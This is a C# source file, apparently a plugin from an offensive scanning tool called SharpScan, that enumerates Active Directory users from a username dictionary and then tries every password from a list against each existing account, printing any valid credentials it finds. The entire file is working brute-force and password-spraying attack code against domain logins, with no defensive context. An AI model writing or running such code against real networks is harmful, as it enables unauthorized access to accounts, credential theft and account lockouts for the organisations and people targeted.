using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Security.Authentication;
using System.Text;

namespace SharpScan.Plugins
{
    internal class KerberEnum
    {

        public static void Run(string Domain)
        {
            foreach (var userName in Configuration.UserDictionary["smb"])
            {
                if (CheckUserExists(Domain, userName))
                {
                    foreach (var password in Configuration.Passwords)
                    {
                        if (AttemptLogin(Domain, userName, password))
                        {
                            Console.WriteLine($"[*](kerberos) User: {userName}  Exist:True,  password: {password}");
                        }
                    }
                }
            }
        }

        static bool CheckUserExists(string domainName, string userName)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    using (UserPrincipal user = new UserPrincipal(context))
                    {
                        user.SamAccountName = userName;
                        using (PrincipalSearcher searcher = new PrincipalSearcher(user))
                        {
                            return searcher.FindOne() != null;
                        }
                    }
                }
            }
            catch (AuthenticationException ex)
            {
                if (ex.Message.Contains("The specified user does not exist") ||
                    ex.Message.Contains("unknown user name or bad password"))
                {
                    return false;
                }
                else
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }

        static bool AttemptLogin(string domainName, string userName, string password)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    return context.ValidateCredentials(userName, password);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"An error occurred during login attempt: {ex.Message}");
                return false;
            }
        }
    }
}
